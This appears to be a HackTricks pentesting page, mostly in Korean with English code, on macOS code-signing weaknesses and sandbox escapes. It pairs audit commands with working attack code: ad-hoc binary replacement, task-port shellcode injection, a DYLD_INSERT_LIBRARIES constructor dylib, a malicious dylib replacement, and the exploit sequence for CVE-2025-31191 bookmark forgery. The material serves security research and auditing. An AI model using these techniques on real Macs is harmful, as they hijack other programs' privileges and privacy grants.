# macOS Code Signing Weaknesses & Sandbox Escapes

{{#include ../../../banners/hacktricks-training.md}}

## Ad-Hoc Signed Binaries

### Basic Information

**Ad-hoc signing** (`CS_ADHOC`)은 **certificate chain이 없는** code signature를 생성합니다. 여전히 signed code를 hash하므로 validation을 통해 modification을 감지할 수 있지만, 다른 component가 authenticate할 수 있는 developer identity는 제공하지 않습니다. Executable을 교체하고 다시 sign하면 다른 CodeDirectory/CDHash가 생성됩니다.<sup>[[1]](#references)[[4]](#references)</sup>

Apple Silicon Mac에서는 모든 executable에 최소한 ad-hoc signature가 필요합니다. 따라서 많은 development tool, Homebrew package 및 third-party utility에서 ad-hoc signature를 확인할 수 있습니다.

### Why This Matters

- **검증 가능한 signer identity 없음** — path, ad-hoc status 또는 고정되지 않은 identifier만 허용하는 check로는 binary를 누가 생성했는지 확인할 수 없습니다.
- **privileged position**(FDA, daemon, helper)에 있는 third-party ad-hoc binary는 해당 file 또는 parent directory가 writable한 경우 우선순위가 높은 target입니다.
- CDHash, designated-requirement 또는 requirement-backed TCC check는 replacement를 **감지합니다**. Path-based policy는 그렇지 않을 수 있으므로, re-signing 후에도 grant가 유지된다고 가정하지 말고 실제 requirement를 확인한 다음 grant를 다시 테스트해야 합니다.

### Discovery
```bash
# Find ad-hoc signed binaries
find /usr/local /opt /Applications -type f -perm +111 -exec sh -c '
flags=$(codesign -dvv "{}" 2>&1 | grep "CodeDirectory flags")
echo "$flags" | grep -q "adhoc" && echo "AD-HOC: {}"
' \; 2>/dev/null

# Check a specific binary
codesign -dv --verbose=4 /path/to/binary 2>&1 | grep -E "Signature|flags|Authority"
# Ad-hoc shows: "Signature=adhoc" and no Authority lines
```
### Attack: Binary Replacement
```bash
# If an ad-hoc signed daemon binary is in a writable location:
# 1. Check the binary's current capabilities
codesign -d --entitlements - /path/to/target 2>&1

# 2. Note its TCC grants in the database
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT service, auth_value FROM access WHERE client LIKE '%target%';"

# 3. Replace the binary (if location is writable)
cp /tmp/malicious-binary /path/to/target

# 4. Re-sign with ad-hoc signature (mimics the original)
codesign -s - /path/to/target

# 5. Relaunch and verify the effective grant. It survives only when the
#    authorization is path-based (or otherwise does not pin the old CDHash).
```
---

## 디버깅 가능한 프로세스 (get-task-allow)

### 기본 정보

**`com.apple.security.get-task-allow`** entitlement(또는 `CS_GET_TASK_ALLOW` flag)은 권한이 부여된 debugger가 Hardened Runtime에서 일반적으로 이를 차단하는 경우에도 프로세스 task port를 획득할 수 있도록 허용합니다. 성공한 debugger는 memory를 읽고, registers를 수정하고, code를 inject하며, execution을 제어할 수 있습니다.<sup>[[3]](#references)</sup>

이는 **development builds에서만** 사용하도록 설계되었습니다. 그러나 일부 third-party binaries는 production 환경에서 이 entitlement를 포함한 채 배포됩니다.

> [!CAUTION]
> production binary에 `get-task-allow`가 있으면 강력한 exploitation primitive가 됩니다. `taskgated`, caller identity, sandboxing, debugger entitlements 및 Developer Tools authorization은 특정 client가 task port를 획득할 수 있는지에 여전히 영향을 줍니다. `lldb`/`debugserver`와 intended injector를 모두 사용해 테스트해야 합니다. attachment가 성공하면 injected code는 target의 entitlements, TCC grants 및 security context로 실행됩니다.

### 탐색
```bash
# Find debuggable binaries
find /Applications /usr/local -type f -perm +111 -exec sh -c '
codesign -d --entitlements - "{}" 2>&1 | grep -q "get-task-allow.*true" && echo "DEBUGGABLE: {}"
' \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path, privileged FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'get_task_allow_signature'
ORDER BY e.privileged DESC;"
```
### 공격: Task Port Injection
```c
#include <mach/mach.h>
#include <mach/mach_vm.h>

// Get the target's task port (requires get-task-allow on target)
mach_port_t task;
kern_return_t kr = task_for_pid(mach_task_self(), target_pid, &task);

if (kr == KERN_SUCCESS) {
// Allocate memory in target process
mach_vm_address_t addr = 0;
mach_vm_allocate(task, &addr, shellcode_size, VM_FLAGS_ANYWHERE);

// Write shellcode into target
mach_vm_write(task, addr, (vm_offset_t)shellcode, shellcode_size);

// Make it executable
mach_vm_protect(task, addr, shellcode_size, FALSE,
VM_PROT_READ | VM_PROT_EXECUTE);

// Create a remote thread to execute the shellcode
// The shellcode runs with ALL of the target's entitlements and TCC grants
}
```
---

## Library Validation 없음 + DYLD Environment

### Runtime Library-Validation Clearing

private entitlement **`com.apple.private.security.clear-library-validation`**은 process launch 시 library validation을 disable하지 않습니다. 대신 process가 runtime에 자체적으로 `csops(..., CS_OPS_CLEAR_LV, ...)`를 호출할 수 있도록 허용합니다. 이후 XNU는 caller가 해당 entitlement를 보유하고 handler의 추가 검사를 충족하는 경우 `CS_REQUIRE_LV | CS_FORCED_LV`를 clear합니다. 결과적으로 process는 library validation을 clear하는 code path에 도달한 후에만 실행 가능한 library-injection target이 될 수 있습니다.<sup>[[4]](#references)[[5]](#references)</sup>

### The Deadly Combination

binary에 다음 두 가지가 **모두** 있는 경우:<sup>[[3]](#references)</sup>
- `com.apple.security.cs.disable-library-validation` (모든 dylib 로드)
- `com.apple.security.cs.allow-dyld-environment-variables` (DYLD env vars 허용)

이는 high-value code-injection 조합입니다. Hardened Runtime이 untrusted library와 DYLD environment variable을 모두 허용하기 때문입니다. launch context에서 여전히 DYLD variables를 scrub할 수 있으므로(예: protected 또는 privileged execution paths), entitlement pair를 unconditional한 것으로 간주하지 말고 정확한 invocation을 검증해야 합니다.

### Discovery
```bash
# Find binaries with the deadly combo
find /Applications -type f -perm +111 -exec sh -c '
ents=$(codesign -d --entitlements - "{}" 2>&1)
echo "$ents" | grep -q "disable-library-validation.*true" && \
echo "$ents" | grep -q "allow-dyld-environment.*true" && \
echo "INJECTABLE: {}"
' \; 2>/dev/null

# Using the scanner (both flags)
sqlite3 /tmp/executables.db "
SELECT path, privileged, tccPermsStr FROM executables
WHERE noLibVal = 1 AND allowDyldEnv = 1
ORDER BY privileged DESC;"
```
### 공격: DYLD_INSERT_LIBRARIES Injection
```bash
# 1. Create the injection dylib
cat > /tmp/inject.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
void injected(void) {
// This runs BEFORE main() in the target's process
// We inherit ALL of the target's:
// - Entitlements
// - TCC grants (camera, mic, FDA, etc.)
// - Sandbox exceptions
// - Mach port rights

FILE *f = fopen("/tmp/injected_proof.txt", "w");
fprintf(f, "Running as PID %d with target's privileges\n", getpid());
fclose(f);

// Example: if target has camera TCC, we can now capture video
// Example: if target has FDA, we can read any file
}
EOF

# 2. Compile the dylib
cc -shared -o /tmp/inject.dylib /tmp/inject.c

# 3. Inject into the target
DYLD_INSERT_LIBRARIES=/tmp/inject.dylib /path/to/noLibVal-dyldEnv-binary

# 4. Verify injection
cat /tmp/injected_proof.txt
```
---

## Sandbox 임시 예외

### Sandbox를 약화시키는 방식

Sandbox 임시 예외(`com.apple.security.temporary-exception.*`)는 App Sandbox에 허점을 만듭니다:<sup>[[2]](#references)</sup>

| 예외 | 허용하는 작업 |
|---|---|
| `temporary-exception.mach-lookup.global-name` | 시스템 전체의 XPC/Mach 서비스에 연결 |
| `temporary-exception.files.absolute-path.read-write` | 앱 컨테이너 외부의 파일 읽기/쓰기 |
| `temporary-exception.iokit-user-client-class` | IOKit user-client 연결 열기 |
| `temporary-exception.shared-preference.read-only` | 다른 앱의 preference 읽기 |
| `temporary-exception.files.home-relative-path.read-write` | `~` 기준 상대 경로에 액세스 |

### Mach-Lookup 예외 = Sandbox Escape Primitive

가장 위험한 예외는 **mach-lookup**입니다. 이를 통해 Sandbox된 앱이 privileged daemon과 통신할 수 있습니다:
```bash
# Find apps with mach-lookup exceptions
find /Applications -name "*.app" -exec sh -c '
binary="$1/Contents/MacOS/$(defaults read "$1/Contents/Info.plist" CFBundleExecutable 2>/dev/null)"
[ -f "$binary" ] && {
ents=$(codesign -d --entitlements - "$binary" 2>&1)
echo "$ents" | grep -q "mach-lookup" && {
count=$(echo "$ents" | grep -c "mach-lookup")
echo "[$count exceptions] $(basename "$1")"
}
}
' _ {} \; 2>/dev/null | sort -rn
```
### Attack: Mach-Lookup을 통한 Sandbox Escape
```
1. Compromise sandboxed app (renderer exploit, malicious document, etc.)
2. Read entitlements to discover mach-lookup exceptions
3. For each reachable service:
a. Connect via NSXPCConnection
b. Discover the service's protocol (class-dump, strings)
c. Fuzz each exposed method
4. Find a vulnerability in a privileged daemon
5. Exploit → code execution in the daemon's context (outside sandbox)
```
---

## Code-Signing Checks Are Not XPC Client Integrity

XPC service는 audit token에서 code-signing 상태를 추출하고, Apple **platform binary**이거나 `CS_REQUIRE_LV`/`CS_FORCED_LV`를 포함한 client를 허용하는 방식으로 connection을 인증할 수 있습니다. 이러한 테스트는 executable과 선택된 process flags를 설명할 뿐이며, 현재 address space에 trusted code만 포함되어 있음을 증명하지는 않습니다. ImageCapture services에 대한 연구에서는 `/bin/ls`와 같은 injection 가능한 Apple binary가 `DYLD_INSERT_LIBRARIES`를 통해 attacker dylib를 load한 다음 platform client로 connect할 수 있음이 확인되었습니다. 이후 library-validation flags를 확인하는 검사도 우회되었으며, Apple은 macOS 15에서 service가 private authorization entitlement를 요구하도록 변경했습니다.<sup>[[6]](#references)</sup>

### Offensive Audit Workflow

1. `listener:shouldAcceptNewConnection:`(또는 이에 상응하는 low-level XPC handler)를 Reverse하고, `isPlatformBinary`, `kSecCodeInfoFlags`, `CS_PLATFORM_BINARY`, `CS_REQUIRE_LV` 또는 `CS_FORCED_LV`만을 기반으로 한 decision을 식별합니다.
2. protocol을 말할 수 있는 Apple-signed client를 열거한 다음 Hardened Runtime과 entitlements를 검사합니다. platform signature만으로 DYLD injection이 차단되었다는 증거가 되지는 않습니다.
3. candidate를 **target macOS build**에서 테스트합니다. constructor dylib가 load되면 해당 constructor에서 service connection을 생성하여 audit token이 허용된 platform process에 속하도록 합니다.
4. 모든 vendor patch를 다시 테스트합니다. 동일한 authorization decision에 또 다른 mutable process-status flag를 추가하는 것만으로는 confused-deputy primitive가 제거되지 않을 수 있습니다.
```bash
# Static triage of the intended client
codesign -dv --verbose=4 /bin/ls 2>&1 | grep -E 'flags=|Runtime Version|TeamIdentifier'
codesign -d --entitlements :- /bin/ls 2>/dev/null | plutil -p -

# Dynamic check using the constructor dylib created earlier in this page
DYLD_PRINT_LIBRARIES=1 DYLD_INSERT_LIBRARIES=/tmp/inject.dylib /bin/ls
```
> [!NOTE]
> DYLD 동작, AMFI 정책 및 service-side checks는 macOS release에 따라 변경됩니다. fully patched host에서 실패했다고 해서 vulnerable release에서도 동일한 chain이 실패했다는 의미는 아닙니다.

---

## Security-Scoped Bookmark Forgery (CVE-2025-31191)

Security-scoped bookmark은 사용자의 file choice를 앱 실행 간에도 유지합니다. sandbox extension은 boot에 종속되므로 `ScopedBookmarkAgent`는 이를 검증하고 장기간 유효한 HMAC-authenticated bookmark을 생성합니다. 이후 앱이 해당 bookmark을 제시하면 agent는 이를 검증하고 새로운 sandbox extension을 발급합니다. signing secret은 login keychain에 저장되며, bundle identifier를 사용해 per-app key가 파생됩니다.<sup>[[7]](#references)</sup>

영향받는 system에서는 keychain ACL이 untrusted process가 `com.apple.scopedbookmarksagent.xpc` secret을 **읽는 것**은 막았지만 삭제는 막지 못했습니다. compromised sandboxed app은 해당 item을 known secret 및 attacker-controlled ACL로 교체하고, app-specific HMAC key를 파생하며, writable container bookmark plist에 entries를 forge한 뒤 `ScopedBookmarkAgent`에 이를 file-access extension으로 교환하도록 요청할 수 있었습니다. 이로 인해 security-scoped bookmark을 사용하는 모든 sandboxed application이 추가적인 file-picker interaction 없이 arbitrary-file-access sandbox escape의 potential target이 되었습니다. Apple은 2025년 3월 31일 security updates에서 이 문제를 수정했습니다.<sup>[[7]](#references)</sup>

### Triage 및 Attack Chain
```bash
APP=/Applications/Target.app
BIN="$APP/Contents/MacOS/$(/usr/libexec/PlistBuddy -c 'Print :CFBundleExecutable' \
"$APP/Contents/Info.plist")"

# Identify apps that can persist app- or document-scoped file access
codesign -d --entitlements :- "$BIN" 2>/dev/null | plutil -p - | \
grep -E 'com.apple.security.files.bookmarks.(app|document)-scope'

# Locate app-managed bookmark stores; names and schemas are application-specific
find "$HOME/Library/Containers" -type f \
\( -iname '*securebookmark*.plist' -o -iname '*securebookmarks*.plist' \) 2>/dev/null

# Inspect metadata for the agent's generic-password item (normally not its secret)
security find-generic-password -s com.apple.scopedbookmarksagent.xpc
```
취약한 host에서의 exploitation sequence는 다음과 같습니다:

1. persistent scoped bookmarks를 사용하는 sandboxed app 내부에서 code execution을 획득합니다.
2. agent의 keychain signing item을 알려진 secret과 permissive ACL로 교체합니다.
3. `HMAC-SHA256(key=known_secret, data=bundle_id)`를 계산하고, app의 writable bookmark store에 있는 유용한 path를 대상으로 bookmark을 forge합니다.
4. 애플리케이션의 일반적인 bookmark-resolution path를 트리거하여 `ScopedBookmarkAgent`가 sandbox extension을 반환하도록 합니다.
5. 새 file access를 사용해 해당 user가 접근할 수 있는 out-of-sandbox execution 또는 data target을 overwrite합니다.

이는 **patched-version technique**입니다. trust boundary를 이해하고 unpatched system을 평가하는 데 사용해야 하며, current release에 대한 가정으로 사용해서는 안 됩니다. current testing에서는 bookmark parsing, identity binding, keychain-item lifecycle, 그리고 agent 주변의 confused-deputy behavior에 집중하세요.

---

## Private Apple Entitlements

### What They Are

`com.apple.private.*`로 시작하는 Entitlements는 third-party developer에게 문서화되거나 제공되지 않는 **Apple-internal APIs**에 대한 access를 제공합니다. private entitlements를 가진 third-party binary는 enterprise cert, MDM 또는 non-App-Store distribution을 통해 이를 획득했습니다.

### Dangerous Private Entitlements

| Entitlement | Capability |
|---|---|
| `com.apple.private.tcc.manager` | Full TCC database read/write |
| `com.apple.private.tcc.allow` | 특정 TCC services에 대한 access |
| `com.apple.private.security.no-sandbox` | sandbox 없이 실행 |
| `com.apple.private.iokit` | Direct IOKit driver access |
| `com.apple.private.kernel.\*` | Kernel interface access |
| `com.apple.private.xpc.launchd.job-label` | launchd jobs 등록 및 관리 |
| `com.apple.rootless.install` | SIP-protected paths에 write |

### Discovery
```bash
# Find third-party binaries with private entitlements
find /Applications /usr/local -type f -perm +111 -exec sh -c '
ents=$(codesign -d --entitlements - "{}" 2>&1)
echo "$ents" | grep -q "com.apple.private" && {
echo "=== {} ==="
echo "$ents" | grep "com.apple.private" | head -10
}
' \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE privateEnts = 1 AND isAppleBin = 0
ORDER BY privileged DESC;"
```
---

## Custom Sandbox Profiles (SBPL)

### 개요

바이너리는 SBPL (Seatbelt Profile Language)로 작성된 **custom sandbox profiles**와 함께 제공될 수 있습니다. 이러한 profile은 기본 App Sandbox보다 더 제한적일 수도 있고, OR **더 permissive**할 수도 있습니다.

### Custom Profiles 감사
```bash
# Find custom sandbox profiles
find /Applications /System -name "*.sb" -o -name "*.sbpl" 2>/dev/null

# Dangerous SBPL rules to flag during audit:
# (allow file-write*)         — Write to ANY file
# (allow process-exec*)       — Execute ANY process
# (allow mach-lookup*)        — Connect to ANY Mach service
# (allow network*)            — Full network access
# (allow iokit*)              — Full IOKit access
# (allow file-read*)          — Read ANY file

# Example: Audit a sandbox profile for overly permissive rules
cat /path/to/custom.sb | grep "(allow" | sort -u
```
---

## 쓰기 가능한 라이브러리 경로

### 정의

바이너리가 현재 사용자가 **쓸 수 있는** 경로에서 동적 라이브러리를 로드하면, 해당 라이브러리를 악성 코드로 교체할 수 있습니다.

### 탐색
```bash
# Using the scanner — find privileged binaries loading from writable paths
sqlite3 /tmp/executables.db "
SELECT e.path, e.privileged
FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'execs_writable_path'
ORDER BY e.privileged DESC
LIMIT 30;"

# Manual check: list library dependencies and check writability
otool -L /path/to/binary | awk '{print $1}' | while read lib; do
[ -f "$lib" ] && [ -w "$lib" ] && echo "WRITABLE: $lib"
done
```
### Attack: Dylib Replacement
```bash
# 1. Find the writable library
otool -L /path/to/target-daemon | grep "/usr/local\|/opt\|Library"

# 2. Back up the original
cp /path/to/writable.dylib /tmp/original.dylib

# 3. Create a replacement that re-exports the original
cat > /tmp/evil.c << 'EOF'
#include <stdio.h>
__attribute__((constructor))
void evil(void) {
system("id > /tmp/escalated.txt");
}
EOF
cc -shared -o /tmp/evil.dylib /tmp/evil.c \
-Wl,-reexport_library,/tmp/original.dylib

# 4. Replace the library
cp /tmp/evil.dylib /path/to/writable.dylib

# 5. When the daemon restarts, it loads the evil dylib with daemon privileges
```
## References

- [1] [Apple Developer — Code Signing Guide](https://developer.apple.com/library/archive/technotes/tn2206/_index.html)
- [2] [Apple Developer — App Sandbox](https://developer.apple.com/library/archive/documentation/Security/Conceptual/AppSandboxDesignGuide/AboutAppSandbox/AboutAppSandbox.html)
- [3] [Apple Developer — Entitlements](https://developer.apple.com/documentation/bundleresources/entitlements)
- [4] [XNU — `bsd/sys/codesign.h` (`CS_OPS_*` operations and `CLEAR_LV_ENTITLEMENT`)](https://github.com/apple-oss-distributions/xnu/blob/main/bsd/sys/codesign.h)
- [5] [XNU — `bsd/kern/kern_proc.c` (`csops` / `CS_OPS_CLEAR_LV` handler)](https://github.com/apple-oss-distributions/xnu/blob/main/bsd/kern/kern_proc.c)
- [6] [macOS Sandbox Escapes의 새로운 시대: 간과된 공격 표면을 살펴보고 10개 이상의 새로운 취약점 발견](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)
- [7] [CVE-2025-31191 분석: macOS security-scoped bookmarks 기반 Sandbox Escape](https://www.microsoft.com/en-us/security/blog/2025/05/01/analyzing-cve-2025-31191-a-macos-security-scoped-bookmarks-based-sandbox-escape/)
{{#include ../../../banners/hacktricks-training.md}}
